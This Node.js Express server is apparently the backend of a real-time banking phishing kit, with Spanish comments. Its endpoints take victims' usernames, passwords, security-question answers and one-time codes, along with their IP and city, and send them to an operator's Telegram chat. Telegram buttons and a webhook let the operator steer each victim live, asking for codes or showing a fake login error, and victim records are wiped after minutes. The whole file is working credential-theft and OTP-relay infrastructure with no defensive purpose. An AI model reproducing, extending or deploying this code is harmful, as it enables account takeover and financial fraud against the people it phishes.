const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const {
    usar, clavv, txid,
    pregunta1, pregunta2,
    respuesta1, respuesta2,
    ip, ciudad
  } = req.body;

  const mensaje = `
❓🔑🔵GM4YL🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

${pregunta1}❓ : ${respuesta1}
${pregunta2}❓ : ${respuesta2}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
     inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 0TP: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
     inline_keyboard: [
      [
        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  // Comando: /txid NN  (NN = código de 2 dígitos)
  if (message?.text && message.text.startsWith('/')) {
    const commandParts = message.text.slice(1).trim().split(' ');
    const txid = commandParts[0];
    const codigoStr = commandParts[1]?.trim();

    // Validar que se envíe exactamente un código de 2 dígitos
    if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `⚠️ Formato inválido.\nUsa: /${txid} NN\nEjemplo: /${txid} 25`
        })
      });
      return res.sendStatus(200);
    }

    // Guardar solo el código de 2 dígitos
    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.codigo = codigoStr;          // Guardamos el código
    cliente.status = 'codigo_guardado'; // Cambiamos el status (puedes usar el que prefieras)
    guardarCliente(txid, cliente);

    // Confirmación al usuario
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: message.chat.id,
        text: `✅ Código guardado correctamente para ${txid}\n🔢 Código: ${codigoStr}`
      })
    });

    return res.sendStatus(200);
  }

  // Manejo de callback_query (botones)
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.status = accion;
    guardarCliente(txid, cliente);

    if (accion === 'preguntas_menu') { // Puedes renombrar este botón si ya no es para preguntas
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `🔢 Envía el código de 2 dígitos para ${txid}\nEjemplo: /${txid} 25`
        })
      });
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Acción seleccionada`
      })
    });
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
